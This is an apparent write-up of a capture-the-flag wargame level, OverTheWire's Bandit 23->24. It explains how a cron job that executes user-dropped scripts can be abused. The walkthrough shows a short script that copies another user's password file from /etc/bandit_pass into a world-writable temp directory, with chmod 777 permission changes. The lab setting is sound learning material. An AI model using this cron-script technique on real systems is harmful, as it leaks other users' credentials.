# BANDIT Level 23 -> 24


## GOAL
To find the next password by analysing a running cronjob and writing our own shell script.


## CONTEXT
Shell scripts are plain text files containing a sequence of commands that are executed automatically by a shell such as GNU Bash or Z shell (ZSH). They allow you to automate repetitive tasks by combining commands, variables, loops, and conditional statements into a reusable program. A script usually begins with a shebang such as `#!/bin/bash`, which tells the operating system to run the file with Bash. 

Shell scripts are widely used for system administration, file processing, and solving command-line tasks efficiently without having to type each command manually.


## STEPS
Once again, we are going to skim through the first commands...

```bash
cd /etc/cron.d/
ls -l
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
```

... to arrive to the following code:

```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

We can ignore the first command (`shopt`) and focus on what the rest of the script does: it goes into the `/var/spool/bandit24/foo` directory and executes the scripts in said directory that are owned by our user, `bandit23`. Then, it deletes said scripts.

Bare in mind that this script will be executed by the user `bandit24`, meaning it can do everything that `bandit24` can do, but is restricted by the same permissions as that user. 

I recommend that you make a temporary directory, write the script there, then move it to the appropriate file path. Make sure that all 'write' and 'execute' permissions you may need are activated (yes, even for the temporary directory). 

```bash
mktemp -d
cd </tmp path>
touch script.sh #creates a file if it does not exist already
nano script.sh #lets you edit said file 
# To save your changes to the file, press Ctrl + S 
# To exit, press Ctrl + X
cp script.sh script_save.sh
mv script.sh /var/spool/bandit24/foo
```

Please make sure you have tried to solve this level yourself before you continue reading. While this is true for any level, this one may be particularly educational for you.


-----------------------------------------------


What we want to do, is have `bandit24` read its password in the `/etc/bandit_pass/` directory and write that into a file we can access. First, we must fill in the script with the following bash code (or something equivalent):

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/<path>/password
```

Then, we must change the permissions so that bandit24 can write into our temporary directory. This includes changing the permissions for the script, the password file and our temporary directory:

```bash
touch password
chmod 666 password

ls -ld </tmp path>
chmod 777 </tmp path>

chmod 777 script.sh

#then we cp and mv the script to where it needs to be
```

Note that you could just not create the password file and change its permissions in the script, or have the script create it.

In a minute's time, you should be able to read the password by simply reading the password file:

```bash
cat password
```


## SUMMARY
We have learnt how to write a shell script to retrieve the password.
